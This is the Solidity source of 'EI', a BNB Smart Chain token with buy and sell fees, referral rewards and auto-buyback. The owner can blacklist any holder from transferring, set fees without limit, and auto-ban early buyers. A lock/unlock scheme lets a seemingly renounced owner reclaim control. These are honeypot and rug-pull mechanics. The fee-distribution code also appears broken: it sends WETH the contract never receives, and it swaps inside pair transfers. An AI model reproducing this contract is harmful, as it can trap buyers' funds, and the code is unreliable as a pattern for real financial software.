/**
 *Submitted for verification at BscScan.com on 2022-03-16
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.4;

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function getUnlockTime() public view returns (uint256) {
        return _lockTime;
    }
    
    function getTime() public view returns (uint256) {
        return block.timestamp;
    }

    // 锁合约
    function lock(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }
    
    function unlock() public virtual {
        require(_previousOwner == msg.sender, "You don't have permission to unlock");
        require(block.timestamp > _lockTime , "Contract is locked until 7 days");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract EI is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "EI";
    string private _symbol = "EI";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 5 * 10**11 * 10**uint256(_decimals);                            // 币总量5千亿

    //address payable public invitationWallet = payable(0xeD71C9E94Fcec686b638f7294550d7A0819E70b8); // 推荐奖励
    address payable public marketingWallet = payable(0x69163390af71dC4d7419b30183D9548821411061);  // 营销
    address payable public fundWallet = payable(0xaC6D04CCB21F1d75f27c5E7B53A5eD89B4Da2feB);       // 资金池
    address payable public lpWallet = payable(0x31f248d52244D79111FfBb0F85f46AAd7b7155ba);         // LP占比分红
    address payable public repoWallet = payable(0x53610C7CD4A31AEb33aEa7b67B555475533bb25f);       // 回购回流地址（以BNB方式，配合 repoTrigger 达到5个BNB自动回购成EI代币）
    address payable public devWallet = payable(0x35e8709bC43bb2e3192618f88ca81e429a7AcD79);        // 技术运维（以BNB方式）
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;             // 销毁
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    mapping (address => bool) public noFee;                                                        // 无手续费名单，方便发行方操作
    mapping (address => bool) public noTxLimit;                                                    // 无交易限制名单，方便发行方操作
    mapping (address => bool) public banned;                                                       // 黑名单
    mapping (address => bool) public pairs;                                                        // pair 列表，判断买卖用
    mapping (address => address) public superiors;                                                 // 推荐关系，窄表，类比用户表的 father_id 字段

    uint256 public buyMarketingFee = 2;
    uint256 public buyInviteOneFee = 2;                                                            // 直推奖励
    uint256 public buyInviteTwoFee = 1;                                                            // 间推奖励
    uint256 public buyLpFee = 4;
    
    uint256 public sellMarketingFee = 2;
    uint256 public sellFundFee = 2;
    uint256 public sellDevFee = 3;
    uint256 public sellRepoFee = 2;
    uint256 public sellBurnFee = 2;

    uint256 public buyFee;                                                 // 买入收取总费用
    uint256 public sellFee;                                                // 卖出收取总费用

    uint256 public repoTrigger = 5;                                        // 回购钱包的BNB达到既定数目则自动回购成EI代币
    uint256 public repoAccumulator;                                        // 回购流向累计
    uint256 public lpAccumulator;                                          // 
    
    uint256 public debugBnb;                                               // 调试打断点专用


    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool public isaddLiquidity;                                             // 一次性开关，不提供修改函数

    uint256 public endtime;                                                 // 分水岭时间，之前的视为机器人，之后的视为正常地址，需要手动设置，否则默认0，并由 当前时间+feeTXtime 得出
    uint256 public feeTXtime;                                               // 从 LP 被创建，第一次买交易发生的 feeTXtime 内的买交易，视为机器人

    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    constructor () {
        IUniswapV2Router02 _uniswapV2Router;
        if (block.chainid == 56) {
            _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);  // Pancake BSC Mainnet
        } else {
            _uniswapV2Router = IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);  // Pancake BSC Testnet
        }

        // https://docs.uniswap.org/protocol/V2/reference/smart-contracts/factory
        // 创建 EI-WETH pair，得到 EI-WETH pair 地址，在 bsc 语境下 WETH 指的 WBNB
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        pairs[address(uniswapPair)] = true;
        
        // 准许 Pair 从币合约地址划转所有币
        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
        
        // 总手续费
        buyFee = buyMarketingFee.add(buyInviteOneFee).add(buyInviteTwoFee).add(buyLpFee);
        sellFee = sellMarketingFee.add(sellFundFee).add(sellDevFee).add(sellRepoFee).add(sellBurnFee);
        
        // 无手续费名单，方便发行方操作
        //noFee[address(uniswapV2Router)] = true;
        noFee[owner()] = true;
        noFee[address(this)] = true;                                                                     // 合约地址本身也会存储额度，并用以调用交易

        // 无交易限制名单，方便发行方操作
        //noTxLimit[address(uniswapV2Router)] = true;
        noTxLimit[owner()] = true;
        noTxLimit[address(this)] = true;                                                                 // 合约地址本身也会存储额度，并用以调用交易

        // 所谓的铸币，就是改变 _totalSupply 和 _balances[account] 的值
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setBanned(address account, bool newValue) external onlyOwner returns (bool){
        banned[account] = newValue;
        return true;
    }

    function setPair(address account, bool newValue) public onlyOwner returns (bool) {
        pairs[account] = newValue;
        return true;
    }

    function setNoTxLimit(address account, bool newValue) external onlyOwner returns (bool) {
        noTxLimit[account] = newValue;
        return true;
    }
    
    function setNoFee(address account, bool newValue) external onlyOwner returns (bool) {
        noFee[account] = newValue;
        return true;
    }

    // 推荐关系绑定 
    function invite(address inviter, address invitee) external onlyOwner returns (bool){
        //require(superiors[invitee] != address(0),"ERC20: already binded");
        if(superiors[invitee] == address(0)){
            superiors[invitee] = inviter;
        }
        return true;
    }
    
    function setBuyFees(uint256 newMarketingFee, uint256 newInviteOneFee, uint256 newInviteTwoFee, uint256 newLpFee) external onlyOwner() returns (bool) {
        buyMarketingFee = newMarketingFee;
        buyInviteOneFee = newInviteOneFee;
        buyInviteTwoFee = newInviteTwoFee;
        buyLpFee = newLpFee;

        buyFee = buyMarketingFee.add(buyInviteOneFee).add(buyInviteTwoFee).add(buyLpFee);
        return true;
    }

    function setSellFees(uint256 newMarketingFee, uint256 newFundFee, uint256 newDevFee, uint256 newRepoFee, uint256 newBurnFee) external onlyOwner() returns (bool) {
        sellMarketingFee = newMarketingFee;
        sellFundFee = newFundFee;
        sellDevFee = newDevFee;
        sellRepoFee = newRepoFee;
        sellBurnFee = newBurnFee;

        sellFee = sellMarketingFee.add(sellFundFee).add(sellDevFee).add(sellRepoFee).add(sellBurnFee);
        return true;
    }
    
    /*
    function setInvitationWallet(address newAddress) external onlyOwner() {
        invitationWallet = payable(newAddress);
    }
    */

    function setMarketingWallet(address newAddress) external onlyOwner() returns (bool) {
        marketingWallet = payable(newAddress);
        return true;
    }

    function setFundWallet(address newAddress) external onlyOwner() returns (bool) {
        fundWallet = payable(newAddress);
        return true;
    }

    function setLpWallet(address newAddress) external onlyOwner() returns (bool) {
        lpWallet = payable(newAddress);
        return true;
    }

    function setRepoWallet(address newAddress) external onlyOwner() returns (bool) {
        repoWallet = payable(newAddress);
        return true;
    }

    function setDevWallet(address newAddress) external onlyOwner() returns (bool) {
        devWallet = payable(newAddress);
        return true;
    }
    
    // 回购触发阈值
    function setRepoTrigger(uint256 newValue) external onlyOwner {
        repoTrigger = newValue;
    }
    
    // 流通的总额 = 总供应量 - 黑洞账户总额
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }
    
    // 以备可能的改变
    function changeRouterVersion(address newRouterAddress) public onlyOwner returns(address newPairAddress) {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(newRouterAddress); 

        newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(address(this), _uniswapV2Router.WETH());

        if(newPairAddress == address(0)) //Create If Doesnt exist
        {
            newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory())
                .createPair(address(this), _uniswapV2Router.WETH());
        }

        uniswapPair = newPairAddress; //Set new pair address
        uniswapV2Router = _uniswapV2Router; //Set new router address

        pairs[address(uniswapPair)] = true;
    }

     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    // DEx 中的买入或卖出
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(!banned[sender], "account is bot");
        
        // anti bot，通过买入时间判断钱包地址为机器人，加入DEx买卖黑名单
        // 买入(sender == uniswapPair)
        // 开关 isaddLiquidity 最关键，一次性的改动，不提供修改函数
        if (sender == uniswapPair && recipient != owner() && !isaddLiquidity) {
            if (endtime == 0) {
                endtime = block.timestamp + feeTXtime;
            }
            if (endtime > block.timestamp) {
                banned[recipient] = true;
            } else {
                isaddLiquidity = true;
            }
        }
        
        // 转账发起额，从发起者账户划走
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 feeEi = 0;
        uint256 fee = 0;

        // 买
        if(pairs[sender] && !noFee[sender] && !noFee[recipient]) {
            // 费用合计，方便后续计算转账给最终接收方的数额
            feeEi = amount.mul(buyFee).div(100);
            fee = feeEi;
            // 费用，先转BNB，再做分配
            _balances[address(this)] += fee;                                                                     // 合约对自身地址全权掌控，所以币放合约地址，方便后续操作
            //uint256 initialBNBBalance = IERC20(uniswapV2Router.WETH()).balanceOf(address(this));                 // 得到本合约地址当下时的BNB余额，以便后面计算得到新增的BNB数额
            uint256 initialBNBBalance = address(this).balance;
            swapTokensForEth(fee);                                                                               // 在 dex 用 EI 买 BNB，直接入账到本合约地址
            //debugBnb += (IERC20(uniswapV2Router.WETH()).balanceOf(address(this))).sub(initialBNBBalance);
            debugBnb += address(this).balance - initialBNBBalance;
            //fee = (IERC20(uniswapV2Router.WETH()).balanceOf(address(this))).sub(initialBNBBalance).div(buyFee);  // 本合约当前BNB余额 - 本合约先前BNB余额 = 新增BNB
            fee = (address(this).balance - initialBNBBalance).div(buyFee);

            // 营销分红
            IERC20(uniswapV2Router.WETH()).transfer(marketingWallet, fee.mul(buyMarketingFee));
            // LP占比分红
            lpAccumulator += fee.mul(buyLpFee);
            IERC20(uniswapV2Router.WETH()).transfer(lpWallet, fee.mul(buyLpFee));
            // 推荐分红
            address superior = superiors[recipient];
            if(superior != address(0)){
                // 直推奖励
                uint256 fatherAllowanceBefore = IERC20(uniswapV2Router.WETH()).allowance(address(this), superior);
                IERC20(uniswapV2Router.WETH()).approve(superior, fee.mul(buyInviteOneFee).add(fatherAllowanceBefore));

                superior = superiors[superior];
            }
            if(superior != address(0)){
                // 间推奖励
                uint256 grandFatherAllowanceBefore = IERC20(uniswapV2Router.WETH()).allowance(address(this), superior);
                IERC20(uniswapV2Router.WETH()).approve(superior, fee.mul(buyInviteTwoFee).add(grandFatherAllowanceBefore));
            }
        // 卖
        }else if(pairs[recipient] && !noFee[sender] && !noFee[recipient]) {
            // 费用合计，方便后续计算转账给最终接收方的数额
            feeEi = amount.mul(sellFee).div(100);
            fee = feeEi.mul(sellFee.sub(sellBurnFee)).div(100);
            _balances[address(this)] += fee;                                                                     // 合约对自身地址全权掌控，所以币放合约地址，方便后续操作
            //uint256 initialBNBBalance = IERC20(uniswapV2Router.WETH()).balanceOf(address(this));                 // 得到本合约地址当下时的BNB余额，以便后面计算得到新增的BNB数额
            uint256 initialBNBBalance = address(this).balance;
            swapTokensForEth(fee);                                                                               // 在 dex 用 EI 买 BNB，直接入账到本合约地址
            //debugBnb += (IERC20(uniswapV2Router.WETH()).balanceOf(address(this))).sub(initialBNBBalance);
            debugBnb += address(this).balance - initialBNBBalance;
            //fee = (IERC20(uniswapV2Router.WETH()).balanceOf(address(this))).sub(initialBNBBalance).div(sellFee.sub(sellBurnFee)); // 本合约当前BNB余额 - 本合约先前BNB余额 = 新增BNB
            fee = (address(this).balance - initialBNBBalance).div(sellFee.sub(sellBurnFee));

            // 销毁，以本币形式
            _balances[deadAddress] += amount.mul(sellBurnFee).div(100);
            emit Transfer(sender, deadAddress, amount.mul(sellBurnFee).div(100));
            // 营销分红
            IERC20(uniswapV2Router.WETH()).transfer(marketingWallet, fee.mul(sellMarketingFee));
            // 资金池
            IERC20(uniswapV2Router.WETH()).transfer(fundWallet, fee.mul(sellFundFee));
            // 技术运维
            IERC20(uniswapV2Router.WETH()).transfer(devWallet, fee.mul(sellDevFee));
            // 自动回购，跟上面的区别在于，上面的是新增的数额即时转账无留存，这里的须得积累到既定的数额自动发生
            repoAccumulator += fee.mul(sellRepoFee);
            if(repoAccumulator >= repoTrigger){
                swapEthForTokens(repoWallet, repoAccumulator);
                repoAccumulator = 0;
            }
        }
            
        // 转账到帐额，加到接收者账户
        amount = amount.sub(feeEi);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        
        return true;
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function swapEthForTokens(address recipient, uint256 ethAmount) private {
        // generate the pancake pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = address(this);

        // make the swap
        uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: ethAmount
        }(
            0, // accept any amount of BNB
            path,
            address(recipient),
            block.timestamp + 360
        );
        emit SwapTokensForETH(ethAmount, path);
    }

    // UP 应该是 update 之意，考虑改为 Update 减少简称以方便阅读
    function setFeeTXtime(uint256 _feeTXtime) external onlyOwner returns (bool) {
        feeTXtime = _feeTXtime;
        return true;
    }

    function setEndtime(uint256 _endtime) external onlyOwner returns (bool) {
        endtime = _endtime;
        return true;
    }


}